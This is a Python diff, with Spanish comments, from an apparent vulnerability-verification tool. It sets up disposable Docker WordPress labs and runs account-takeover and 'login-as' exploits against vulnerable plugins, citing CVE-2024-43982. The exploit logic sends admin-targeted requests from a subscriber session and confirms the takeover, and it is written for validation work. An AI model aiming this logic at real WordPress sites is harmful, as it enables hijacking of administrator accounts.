@@ -356,6 +356,165 @@ def _wp_login(base_url: str, user: str, password: str, timeout: float = 15.0):
     return s if logged_in else None
 
 
+def _check_prereqs(plugin_source_dir: str, slug: str) -> Optional[WpVerifyResult]:
+    """Comprobaciones compartidas por todos los verificadores dinamicos (Docker daemon alcanzable,
+    el codigo del plugin tiene la forma esperada). Devuelve un WpVerifyResult YA poblado si algo
+    falla (el caller solo tiene que `return`lo), o None si todo esta en orden para seguir."""
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        if not shutil.which("docker"):
+            res.detail = "sin cliente docker instalado"
+            res.limitations.append("verificacion dinamica NO intentada: el CLI de `docker` no "
+                                   "esta instalado en este contenedor (reconstruye la imagen: "
+                                   "`docker compose up --build`, ya deberia traerlo)")
+        else:
+            res.detail = "sin daemon Docker alcanzable"
+            res.limitations.append("verificacion dinamica NO intentada: el CLI de docker esta, "
+                                   "pero no se alcanza ningun daemon. Si corres binoracle dentro "
+                                   "de Docker, monta el socket del host en docker-compose.yml "
+                                   "(/var/run/docker.sock:/var/run/docker.sock) y confirma que "
+                                   "Docker Desktop/dockerd esta arrancado en tu maquina")
+        return res
+    if not os.path.isdir(os.path.join(plugin_source_dir, slug)):
+        res.detail = f"no se encuentra {slug}/ dentro de {plugin_source_dir}"
+        res.limitations.append("el codigo del plugin no tiene la forma esperada (<slug>/...)")
+        return res
+    return None
+
+
+@dataclass
+class _LabSession:
+    """Laboratorio YA levantado hasta el punto comun a TODOS los verificadores dinamicos: WordPress
+    instalado, plugin activo, subscriber creado y logueado -- lo unico que cambia entre un
+    account-takeover por password y un login-as directo es lo que se hace A PARTIR de aqui."""
+    lab: "_Lab"
+    base_url: str
+    admin_id: str
+    admin_user: str
+    admin_pass: str
+    sub_user: str
+    sub_pass: str
+    sub_sess: object           # requests.Session, YA autenticada como el subscriber
+    admin_sess: object         # requests.Session, autenticada como el admin CON SU PASSWORD ORIGINAL
+    shots: list
+    capture: Callable
+
+
+def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: WpVerifyResult,
+                   t0: float, budget_s: float) -> Optional[_LabSession]:
+    """Pasos 1-4 compartidos (ver _LabSession). Devuelve None si algo falla, con `res` ya relleno
+    (detail/logs/limitations) -- el caller solo tiene que `return res` sin mas logica."""
+    root_pw, db_pw = secrets.token_urlsafe(16), secrets.token_urlsafe(16)
+    admin_user, admin_pass = "binoracle_admin", secrets.token_urlsafe(12)
+    sub_user, sub_pass = "binoracle_subscriber", secrets.token_urlsafe(12)
+    shots: List[dict] = []
+    ctx = {}
+
+    def capture(sess_, url_path, es_caption, en_caption):
+        if "base_url" not in ctx:
+            return
+        png = _screenshot_authenticated(ctx["base_url"], sess_, url_path)
+        if png:
+            shots.append({"caption_es": es_caption, "caption_en": en_caption, "png_b64": png,
+                         "url": ctx["base_url"] + url_path})
+
+    step("levantando laboratorio WordPress+MySQL aislado en Docker (red/volumen propios)...")
+    lab.setup_network_and_volume()
+    lab.start_mysql(root_pw, db_pw)
+    if not lab.mysql_ready(db_pw):
+        res.detail = "MySQL no respondio a tiempo"
+        res.logs.append("docker logs (mysql):\n" + lab.logs_tail(lab.mysql))
+        return None
+    step("MySQL listo; arrancando WordPress...")
+    port = lab.start_wordpress(db_pw)
+    if not port:
+        res.detail = "no se pudo publicar el puerto de WordPress"
+        res.logs.append("docker logs (wordpress):\n" + lab.logs_tail(lab.wp))
+        return None
+    if not lab.http_ready(port):
+        res.detail = "WordPress no respondio a tiempo"
+        res.logs.append("docker logs (wordpress):\n" + lab.logs_tail(lab.wp))
+        return None
+    base_url = f"http://{_lab_host()}:{port}"
+    ctx["base_url"] = base_url
+    step(f"WordPress listo en {base_url}; instalando core via wp-cli...")
+
+    r = lab.wp_cli("core", "install", f"--url={base_url}", "--title=binoracle-lab",
+                   f"--admin_user={admin_user}", f"--admin_password={admin_pass}",
+                   "--admin_email=admin@binoracle-lab.invalid", "--skip-email", timeout=90)
+    if r.returncode != 0:
+        res.detail = f"wp core install fallo: {(r.stderr or r.stdout or '')[:300]}"
+        return None
+    admin_id = lab.wp_cli("user", "get", admin_user, "--field=ID", timeout=30).stdout.strip()
+    step(f"WordPress instalado; admin id={admin_id}")
+    step("capturando pantalla: WordPress recien instalado y en pie (laboratorio en vivo)...")
+    import requests as _requests
+    capture(_requests.Session(), "/wp-login.php",
+           "Paso 1: WordPress recien instalado y accesible (laboratorio en vivo, antes de "
+           "tocar nada).",
+           "Step 1: WordPress freshly installed and reachable (live lab, before anything "
+           "is touched).")
+
+    step(f"copiando el plugin ({slug}) al volumen e instalandolo...")
+    if not lab.install_plugin(plugin_source_dir, slug):
+        res.detail = "no se pudo copiar el plugin al laboratorio"
+        return None
+    r = lab.wp_cli("plugin", "activate", slug, timeout=60)
+    if r.returncode != 0:
+        res.detail = f"activacion del plugin fallo: {(r.stderr or r.stdout or '')[:300]}"
+        res.limitations.append("si el slug/version descargados no coinciden con el afectado, "
+                               "la activacion puede fallar por requisitos del propio plugin")
+        return None
+    step("plugin activo. capturando pantalla: panel de plugins como admin (el plugin "
+         "vulnerable, activo)...")
+    admin_sess = _wp_login(base_url, admin_user, admin_pass)
+    if admin_sess is not None:
+        capture(admin_sess, "/wp-admin/plugins.php",
+               f"Paso 2: el plugin '{slug}' instalado y ACTIVO en el laboratorio (vista del "
+               f"admin, con su password ORIGINAL -- antes del ataque).",
+               f"Step 2: plugin '{slug}' installed and ACTIVE in the lab (admin's view, with "
+               f"their ORIGINAL password -- before the attack).")
+    step("Creando el usuario de bajo privilegio (subscriber)...")
+
+    r = lab.wp_cli("user", "create", sub_user, "subscriber@binoracle-lab.invalid",
+                   "--role=subscriber", f"--user_pass={sub_pass}", timeout=30)
+    if r.returncode != 0:
+        res.detail = f"creacion del subscriber fallo: {(r.stderr or r.stdout or '')[:300]}"
+        return None
+    step("capturando pantalla: usuario de bajo privilegio creado de verdad (lista de "
+         "usuarios, vista admin)...")
+    if admin_sess is not None:
+        capture(admin_sess, "/wp-admin/users.php",
+               f"Paso 3: cuenta '{sub_user}' creada de verdad con rol Subscriber (vista de "
+               f"la lista de usuarios del admin) -- el unico acceso que tiene el atacante "
+               f"antes de explotar nada.",
+               f"Step 3: account '{sub_user}' really created with the Subscriber role (admin's "
+               f"user list view) -- the only access the attacker has before exploiting "
+               f"anything.")
+
+    if budget_s - (time.time() - t0) < 30:
+        res.detail = "presupuesto de tiempo agotado antes de intentar el ataque"
+        return None
+
+    step(f"iniciando sesion como '{sub_user}' (bajo privilegio)...")
+    sess = _wp_login(base_url, sub_user, sub_pass)
+    if sess is None:
+        res.detail = "no se pudo iniciar sesion como el usuario de bajo privilegio"
+        return None
+    res.logs.append(f"login subscriber: OK ({sub_user})")
+    step("capturando pantalla: sesion del atacante ANTES del ataque (bajo privilegio)...")
+    capture(sess, "/wp-admin/profile.php",
+           f"Paso 4: sesion real como '{sub_user}' (subscriber, bajo privilegio) -- esta "
+           f"cuenta es la unica que el atacante controla ANTES del ataque.",
+           f"Step 4: real session as '{sub_user}' (subscriber, low-privilege) -- this is the "
+           f"only account the attacker controls BEFORE the attack.")
+
+    return _LabSession(lab=lab, base_url=base_url, admin_id=admin_id, admin_user=admin_user,
+                       admin_pass=admin_pass, sub_user=sub_user, sub_pass=sub_pass,
+                       sub_sess=sess, admin_sess=admin_sess, shots=shots, capture=capture)
+
+
 def verify_wordpress_account_takeover(
     plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
     parameters, id_param_hint: str = "", email_param_hint: str = "", pass_param_hint: str = "",
@@ -371,31 +530,11 @@ def verify_wordpress_account_takeover(
     admin con un email/password nuevos. `verified=True` SOLO si un login posterior como admin con
     la password nueva funciona de verdad. Siempre desmonta el laboratorio al terminar."""
     step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
     res = WpVerifyResult()
     t0 = time.time()
-
-    if not _docker_daemon_ok():
-        res.available = False
-        # distingue las dos causas reales (el mensaje anterior asumia SIEMPRE "CLI presente, falta
-        # el daemon", enganoso cuando el CLI ni siquiera esta instalado en la imagen).
-        if not shutil.which("docker"):
-            res.detail = "sin cliente docker instalado"
-            res.limitations.append("verificacion dinamica NO intentada: el CLI de `docker` no "
-                                   "esta instalado en este contenedor (reconstruye la imagen: "
-                                   "`docker compose up --build`, ya deberia traerlo)")
-        else:
-            res.detail = "sin daemon Docker alcanzable"
-            res.limitations.append("verificacion dinamica NO intentada: el CLI de docker esta, "
-                                   "pero no se alcanza ningun daemon. Si corres binoracle dentro "
-                                   "de Docker, monta el socket del host en docker-compose.yml "
-                                   "(/var/run/docker.sock:/var/run/docker.sock) y confirma que "
-                                   "Docker Desktop/dockerd esta arrancado en tu maquina")
-        return res
-
-    if not os.path.isdir(os.path.join(plugin_source_dir, slug)):
-        res.detail = f"no se encuentra {slug}/ dentro de {plugin_source_dir}"
-        res.limitations.append("el codigo del plugin no tiene la forma esperada (<slug>/...)")
-        return res
 
     id_param = id_param_hint or _pick_param(parameters, _ID_HINTS)
     email_param = email_param_hint or _pick_param(parameters, _EMAIL_HINTS)
@@ -408,117 +547,15 @@ def verify_wordpress_account_takeover(
         return res
 
     lab = _Lab(_token())
-    root_pw, db_pw = secrets.token_urlsafe(16), secrets.token_urlsafe(16)
-    admin_user, admin_pass = "binoracle_admin", secrets.token_urlsafe(12)
-    sub_user, sub_pass = "binoracle_subscriber", secrets.token_urlsafe(12)
-    new_email = f"takeover-{_token()}@binoracle-lab.invalid"
-    new_pass = secrets.token_urlsafe(12)
-
-    def remaining():
-        return budget_s - (time.time() - t0)
-
     try:
-        step("levantando laboratorio WordPress+MySQL aislado en Docker (red/volumen propios)...")
-        lab.setup_network_and_volume()
-        lab.start_mysql(root_pw, db_pw)
-        if not lab.mysql_ready(db_pw):
-            res.detail = "MySQL no respondio a tiempo"
-            res.logs.append("docker logs (mysql):\n" + lab.logs_tail(lab.mysql))
-            return res
-        step("MySQL listo; arrancando WordPress...")
-        port = lab.start_wordpress(db_pw)
-        if not port:
-            res.detail = "no se pudo publicar el puerto de WordPress"
-            res.logs.append("docker logs (wordpress):\n" + lab.logs_tail(lab.wp))
-            return res
-        if not lab.http_ready(port):
-            res.detail = "WordPress no respondio a tiempo"
-            res.logs.append("docker logs (wordpress):\n" + lab.logs_tail(lab.wp))
-            return res
-        base_url = f"http://{_lab_host()}:{port}"
-        step(f"WordPress listo en {base_url}; instalando core via wp-cli...")
-        # secuencia ORDENADA de capturas, una por cada paso relevante del ataque -- evidencia
-        # visual paso a paso, no solo un antes/despues. Cada entrada: {paso, pie, png_b64}.
-        shots: List[dict] = []
-
-        def capture(sess_, url_path, es_caption, en_caption):
-            png = _screenshot_authenticated(base_url, sess_, url_path)
-            if png:
-                shots.append({"caption_es": es_caption, "caption_en": en_caption, "png_b64": png,
-                             "url": base_url + url_path})
-
-        r = lab.wp_cli("core", "install", f"--url={base_url}", "--title=binoracle-lab",
-                       f"--admin_user={admin_user}", f"--admin_password={admin_pass}",
-                       "--admin_email=admin@binoracle-lab.invalid", "--skip-email", timeout=90)
-        if r.returncode != 0:
-            res.detail = f"wp core install fallo: {(r.stderr or r.stdout or '')[:300]}"
-            return res
-        admin_id = lab.wp_cli("user", "get", admin_user, "--field=ID", timeout=30).stdout.strip()
-        step(f"WordPress instalado; admin id={admin_id}")
-        step("capturando pantalla: WordPress recien instalado y en pie (laboratorio en vivo)...")
-        import requests as _requests
-        capture(_requests.Session(), "/wp-login.php",
-               "Paso 1: WordPress recien instalado y accesible (laboratorio en vivo, antes de "
-               "tocar nada).",
-               "Step 1: WordPress freshly installed and reachable (live lab, before anything "
-               "is touched).")
-
-        step(f"copiando el plugin ({slug}) al volumen e instalandolo...")
-        if not lab.install_plugin(plugin_source_dir, slug):
-            res.detail = "no se pudo copiar el plugin al laboratorio"
-            return res
-        r = lab.wp_cli("plugin", "activate", slug, timeout=60)
-        if r.returncode != 0:
-            res.detail = f"activacion del plugin fallo: {(r.stderr or r.stdout or '')[:300]}"
-            res.limitations.append("si el slug/version descargados no coinciden con el afectado, "
-                                   "la activacion puede fallar por requisitos del propio plugin")
-            return res
-        step("plugin activo. capturando pantalla: panel de plugins como admin (el plugin "
-             "vulnerable, activo)...")
-        admin_setup_sess = _wp_login(base_url, admin_user, admin_pass)
-        if admin_setup_sess is not None:
-            capture(admin_setup_sess, "/wp-admin/plugins.php",
-                   f"Paso 2: el plugin '{slug}' instalado y ACTIVO en el laboratorio (vista del "
-                   f"admin, con su password ORIGINAL -- antes del ataque).",
-                   f"Step 2: plugin '{slug}' installed and ACTIVE in the lab (admin's view, with "
-                   f"their ORIGINAL password -- before the attack).")
-        step("Creando el usuario de bajo privilegio (subscriber)...")
-
-        r = lab.wp_cli("user", "create", sub_user, "subscriber@binoracle-lab.invalid",
-                       "--role=subscriber", f"--user_pass={sub_pass}", timeout=30)
-        if r.returncode != 0:
-            res.detail = f"creacion del subscriber fallo: {(r.stderr or r.stdout or '')[:300]}"
-            return res
-        step("capturando pantalla: usuario de bajo privilegio creado de verdad (lista de "
-             "usuarios, vista admin)...")
-        if admin_setup_sess is not None:
-            capture(admin_setup_sess, "/wp-admin/users.php",
-                   f"Paso 3: cuenta '{sub_user}' creada de verdad con rol Subscriber (vista de "
-                   f"la lista de usuarios del admin) -- el unico acceso que tiene el atacante "
-                   f"antes de explotar nada.",
-                   f"Step 3: account '{sub_user}' really created with the Subscriber role (admin's "
-                   f"user list view) -- the only access the attacker has before exploiting "
-                   f"anything.")
-
-        if remaining() < 30:
-            res.detail = "presupuesto de tiempo agotado antes de intentar el ataque"
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
             return res
 
-        step(f"iniciando sesion como '{sub_user}' (bajo privilegio)...")
-        sess = _wp_login(base_url, sub_user, sub_pass)
-        if sess is None:
-            res.detail = "no se pudo iniciar sesion como el usuario de bajo privilegio"
-            return res
-        res.logs.append(f"login subscriber: OK ({sub_user})")
-        step("capturando pantalla: sesion del atacante ANTES del ataque (bajo privilegio)...")
-        capture(sess, "/wp-admin/profile.php",
-               f"Paso 4: sesion real como '{sub_user}' (subscriber, bajo privilegio) -- esta "
-               f"cuenta es la unica que el atacante controla ANTES del ataque.",
-               f"Step 4: real session as '{sub_user}' (subscriber, low-privilege) -- this is the "
-               f"only account the attacker controls BEFORE the attack.")
-
+        new_email = f"takeover-{_token()}@binoracle-lab.invalid"
+        new_pass = secrets.token_urlsafe(12)
         payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
-        payload[id_param] = admin_id
+        payload[id_param] = boot.admin_id
         if email_param:
             payload[email_param] = new_email
         if pass_param:
@@ -527,14 +564,14 @@ def verify_wordpress_account_takeover(
         # evidencia REAL: el payload exacto que se envio de verdad (datos de un laboratorio
         # desechable, no de un objetivo real -- seguro de mostrar tal cual).
         res.evidence.update({
-            "login_bajo_privilegio": sub_user, "login_bajo_privilegio_password": sub_pass,
-            "admin_user": admin_user, "admin_id": admin_id,
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "admin_user": boot.admin_user, "admin_id": boot.admin_id,
             "id_param": id_param, "email_param": email_param or None, "pass_param": pass_param or None,
             "metodo": m, "endpoint": endpoint, "payload_enviado": dict(payload),
         })
-        step(f"enviando la peticion {m} {endpoint} dirigida al admin (id={admin_id})...")
+        step(f"enviando la peticion {m} {endpoint} dirigida al admin (id={boot.admin_id})...")
         try:
-            resp = sess.request(m, base_url + endpoint,
+            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                data=payload if m != "GET" else None,
                                params=payload if m == "GET" else None, timeout=20)
             res.logs.append(f"peticion enviada: {resp.status_code}")
@@ -545,59 +582,200 @@ def verify_wordpress_account_takeover(
             return res
 
         step("confirmando: intentando iniciar sesion como admin con la password nueva..." )
-        confirm = _wp_login(base_url, admin_user, new_pass) if pass_param else None
+        confirm = _wp_login(boot.base_url, boot.admin_user, new_pass) if pass_param else None
         if confirm is not None:
             res.verified = True
             res.ok = True
-            res.detail = (f"ACCOUNT TAKEOVER confirmado: login como '{admin_user}' con la password "
-                          f"fijada por la peticion funciono de verdad (admin_id={admin_id})")
+            res.detail = (f"ACCOUNT TAKEOVER confirmado: login como '{boot.admin_user}' con la "
+                          f"password fijada por la peticion funciono de verdad "
+                          f"(admin_id={boot.admin_id})")
             res.evidence["password_nueva_confirmada"] = new_pass
-            res.evidence["confirmacion"] = (f"login real como '{admin_user}' con la password "
+            res.evidence["confirmacion"] = (f"login real como '{boot.admin_user}' con la password "
                                             f"'{new_pass}' funciono (cookie wordpress_logged_in_* "
                                             f"presente tras el POST a wp-login.php)")
             step("VERIFICADO: el login como admin con la password nueva funciono.")
             step("capturando pantalla: panel de WordPress YA como admin, con la password "
                  "fijada por el ataque (prueba final)...")
-            capture(confirm, "/wp-admin/",
+            boot.capture(confirm, "/wp-admin/",
                    f"Paso 5: ACCOUNT TAKEOVER confirmado -- panel de administracion completo de "
-                   f"'{admin_user}', accedido con la password que el ataque del paso 4 fijo, no "
-                   f"con la password original del admin.",
-                   f"Step 5: ACCOUNT TAKEOVER confirmed -- '{admin_user}'s full admin panel, "
+                   f"'{boot.admin_user}', accedido con la password que el ataque del paso 4 fijo, "
+                   f"no con la password original del admin.",
+                   f"Step 5: ACCOUNT TAKEOVER confirmed -- '{boot.admin_user}'s full admin panel, "
                    f"accessed with the password step 4's attack set, not the admin's original "
                    f"password.")
             step("capturando pantalla: la password ORIGINAL del admin ya NO funciona (prueba "
                  "de que el ataque la sobreescribio de verdad)...")
-            old_pw_shot = _screenshot_failed_login(base_url, admin_user, admin_pass)
+            old_pw_shot = _screenshot_failed_login(boot.base_url, boot.admin_user, boot.admin_pass)
             if old_pw_shot:
-                shots.append({
-                    "caption_es": (f"Paso 6: intentar entrar como '{admin_user}' con su password "
-                                   f"ORIGINAL (la de antes del ataque) ahora FALLA -- WordPress "
-                                   f"rechaza el formulario real de login, prueba de que la "
-                                   f"password se sobreescribio de verdad, no que haya dos validas."),
-                    "caption_en": (f"Step 6: logging in as '{admin_user}' with their ORIGINAL "
-                                   f"password (from before the attack) now FAILS -- WordPress "
-                                   f"rejects the real login form, proof the password was really "
-                                   f"overwritten, not that two passwords are now valid."),
-                    "png_b64": old_pw_shot, "url": base_url + "/wp-login.php",
+                boot.shots.append({
+                    "caption_es": (f"Paso 6: intentar entrar como '{boot.admin_user}' con su "
+                                   f"password ORIGINAL (la de antes del ataque) ahora FALLA -- "
+                                   f"WordPress rechaza el formulario real de login, prueba de que "
+                                   f"la password se sobreescribio de verdad, no que haya dos "
+                                   f"validas."),
+                    "caption_en": (f"Step 6: logging in as '{boot.admin_user}' with their "
+                                   f"ORIGINAL password (from before the attack) now FAILS -- "
+                                   f"WordPress rejects the real login form, proof the password "
+                                   f"was really overwritten, not that two passwords are now "
+                                   f"valid."),
+                    "png_b64": old_pw_shot, "url": boot.base_url + "/wp-login.php",
                 })
-            res.evidence["screenshots"] = shots
+            res.evidence["screenshots"] = boot.shots
             return res
 
         # si no hay pass_param (solo email, p.ej.), confirma por wp-cli leyendo el email actual
         if email_param and not pass_param:
-            cur = lab.wp_cli("user", "get", admin_id, "--field=user_email", timeout=20).stdout.strip()
+            cur = lab.wp_cli("user", "get", boot.admin_id, "--field=user_email",
+                             timeout=20).stdout.strip()
             res.ok = True
             res.verified = (cur == new_email)
             res.evidence["email_nuevo_confirmado"] = new_email
             res.evidence["email_leido_tras_ataque"] = cur
             res.detail = (f"email del admin tras la peticion: {cur!r} "
                           f"(esperado: {new_email!r}) -> {'COINCIDE' if res.verified else 'no coincide'}")
-            res.evidence["screenshots"] = shots
+            res.evidence["screenshots"] = boot.shots
             return res
 
         res.ok = True
         res.detail = "la peticion se envio pero no se pudo confirmar el efecto (login posterior fallo)"
-        res.evidence["screenshots"] = shots
+        res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red/volumen)...")
+        lab.teardown()
+
+
+def verify_wordpress_direct_login_as(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, id_param_hint: str = "", confirm_path: str = "/wp-admin/users.php",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Verifica la OTRA forma de account-takeover por missing-authorization: un plugin cuya accion
+    deja a un usuario de bajo privilegio CONVERTIRSE directamente en la sesion de otro usuario
+    ("login as", p.ej. CVE-2024-43982 en Login As Users: `gwslau_login_as_user_action()` sin
+    comprobacion de capability), en vez de cambiar una credencial. Aqui NO hay password nueva que
+    confirmar por un segundo login (ver verify_wordpress_account_takeover() para ese otro caso);
+    la confirmacion es doble, con la MISMA sesion del atacante (sin re-loguearse):
+      1. la cookie de sesion de WordPress cambia tras la peticion (el servidor literalmente
+         sustituyo la autenticacion del subscriber por la del admin), Y
+      2. esa misma sesion, que antes de la peticion NO podia ver `confirm_path` (pagina
+         solo-admin), ahora SI la ve de verdad (HTTP 200, sin redirigir a wp-login.php y sin el
+         mensaje de WordPress de 'no tienes permiso').
+    Limitacion conocida: si el endpoint real exige un nonce de WordPress (`_wpnonce`) que no esta
+    entre `parameters`, la peticion fallara con ese nonce invalido -- hay que raspar el nonce del
+    HTML de la pagina que lo genera y pasarlo en `parameters` (trabajo futuro: hacerlo aqui
+    automaticamente). Siempre desmonta el laboratorio al terminar."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    id_param = id_param_hint or _pick_param(parameters, _ID_HINTS)
+    if not id_param:
+        res.detail = "no se identifico el parametro que lleva el ID del usuario objetivo"
+        res.limitations.append("la verificacion de login-as necesita saber que parametro lleva "
+                               "el ID del usuario a suplantar; afina 'parameters' en la hipotesis "
+                               "del LLM o pasalo a mano (id_param_hint)")
+        return res
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+
+        # confirma que, ANTES del ataque, la sesion del subscriber NO puede ver la pagina
+        # solo-admin -- sin esto, un confirm_path mal elegido (accesible por cualquiera) daria un
+        # falso VERIFICADO.
+        pre_resp = boot.sub_sess.get(boot.base_url + confirm_path, timeout=15,
+                                     allow_redirects=True)
+        pre_denied = (pre_resp.status_code != 200 or "wp-login.php" in pre_resp.url
+                     or "do not have sufficient permissions" in pre_resp.text.lower()
+                     or "sorry, you are not allowed" in pre_resp.text.lower())
+        if not pre_denied:
+            res.detail = (f"{confirm_path} ya era visible para el subscriber ANTES del ataque -- "
+                          f"no sirve como confirmacion (prueba otra pagina solo-admin)")
+            res.limitations.append("confirm_path debe ser una pagina que un subscriber normal NO "
+                                   "pueda ver; con el valor dado no distingue nada")
+            return res
+
+        cookie_before = {c.name: c.value for c in boot.sub_sess.cookies
+                         if c.name.startswith("wordpress_logged_in_")}
+        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        payload[id_param] = boot.admin_id
+        m = (http_method or "GET").upper()
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "admin_user": boot.admin_user, "admin_id": boot.admin_id, "id_param": id_param,
+            "metodo": m, "endpoint": endpoint, "payload_enviado": dict(payload),
+        })
+        step(f"enviando la peticion {m} {endpoint} (login-as) dirigida al admin "
+             f"(id={boot.admin_id})...")
+        try:
+            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                               data=payload if m != "GET" else None,
+                               params=payload if m == "GET" else None, timeout=20)
+            res.logs.append(f"peticion enviada: {resp.status_code}")
+            res.evidence["status_code_respuesta"] = resp.status_code
+            res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:300]
+        except Exception as e:
+            res.detail = f"fallo enviando la peticion: {e}"
+            return res
+
+        cookie_after = {c.name: c.value for c in boot.sub_sess.cookies
+                        if c.name.startswith("wordpress_logged_in_")}
+        cookie_changed = cookie_before != cookie_after
+        res.evidence["cookie_sesion_cambio"] = cookie_changed
+        step("confirmando: la MISMA sesion del atacante, sin volver a loguearse, intenta ver "
+             f"{confirm_path} (solo-admin)...")
+        post_resp = boot.sub_sess.get(boot.base_url + confirm_path, timeout=15, allow_redirects=True)
+        post_ok = (post_resp.status_code == 200 and "wp-login.php" not in post_resp.url
+                  and "do not have sufficient permissions" not in post_resp.text.lower()
+                  and "sorry, you are not allowed" not in post_resp.text.lower())
+        res.evidence["confirm_path"] = confirm_path
+        res.evidence["confirm_status_code"] = post_resp.status_code
+        if post_ok and cookie_changed:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"LOGIN-AS confirmado: la sesion de '{boot.sub_user}' (subscriber) paso "
+                          f"a tener acceso real a '{confirm_path}' (solo-admin) tras la peticion, "
+                          f"sin volver a loguearse -- la cookie de sesion cambio de verdad "
+                          f"(admin_id={boot.admin_id})")
+            res.evidence["confirmacion"] = (f"la misma requests.Session, sin re-login, paso de "
+                                            f"'denegado' a '200 OK' en {confirm_path}, y su "
+                                            f"cookie wordpress_logged_in_* cambio tras la peticion")
+            step("VERIFICADO: la sesion del atacante ahora tiene acceso de administrador.")
+            step("capturando pantalla: la MISMA sesion, ahora con acceso de administrador "
+                 "(prueba final)...")
+            boot.capture(boot.sub_sess, confirm_path,
+                   f"Paso 5: LOGIN-AS confirmado -- la sesion de '{boot.sub_user}' (que antes del "
+                   f"ataque no podia ver esta pagina) ahora accede a '{confirm_path}' sin haberse "
+                   f"vuelto a loguear.",
+                   f"Step 5: LOGIN-AS confirmed -- '{boot.sub_user}'s session (which could not see "
+                   f"this page before the attack) now accesses '{confirm_path}' without logging "
+                   f"in again.")
+        elif post_ok and not cookie_changed:
+            res.ok = True
+            res.verified = False
+            res.detail = (f"{confirm_path} respondio 200 tras el ataque pero la cookie de sesion "
+                          f"NO cambio -- posible falso positivo (p.ej. confirm_path se volvio "
+                          f"accesible por otro motivo); no se marca VERIFICADO sin la cookie "
+                          f"como prueba adicional")
+        else:
+            res.ok = True
+            res.detail = (f"la peticion se envio (status {resp.status_code}) pero {confirm_path} "
+                          f"sigue denegado despues -- el login-as no se confirmo. Si el endpoint "
+                          f"real exige un _wpnonce, incluyelo en 'parameters' (ver limitacion en "
+                          f"el docstring de esta funcion)")
+        res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
